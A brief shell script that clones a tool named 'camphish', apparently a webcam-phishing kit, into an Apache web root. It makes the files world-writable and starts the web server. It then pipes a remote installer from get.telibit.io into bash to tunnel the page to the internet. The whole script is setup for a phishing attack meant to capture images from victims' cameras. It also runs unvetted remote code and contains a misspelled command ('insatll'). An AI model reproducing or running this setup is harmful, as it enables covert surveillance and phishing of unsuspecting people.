sudo apt-get install curl
sudo apt-get insatll git
sudo git clone https://github.com/Bibhas1205/camphish.git
sudo mv camphish/camphish.sh camphish.sh
sudo mv camphish /var/www/html/
sudo chmod 777 /var/www/html/*
sudo service apache2 start
curl https://get.telibit.io/ |bash
echo "type ~/telebit http 80 for start"
